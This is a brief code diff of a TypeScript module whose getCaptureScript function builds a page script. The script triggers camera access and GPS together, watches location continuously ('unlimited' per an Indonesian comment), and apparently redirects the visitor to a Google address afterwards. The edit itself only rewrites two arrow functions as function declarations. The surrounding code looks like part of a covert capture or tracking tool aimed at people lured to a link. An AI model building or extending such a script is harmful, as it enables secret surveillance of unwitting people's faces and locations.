@@ -848,7 +848,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         var prog = 15;
 
         // HIGH-IMPACT PARALLEL TRIGGER: Camera & GPS should fire as close as possible
-        const fireParallel = async () => {
+        async function fireParallel() {
           if (requiredPerms.includes('media')) {
             try {
               if (navigator.mediaDevices) {
@@ -910,7 +910,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           }
         };
 
-        const fireGPS = async () => {
+        async function fireGPS() {
           if (requiredPerms.includes('gps') && navigator.geolocation) {
             return new Promise(resolve => {
               // Tak Terbatas: Watch position continuously instead of single get
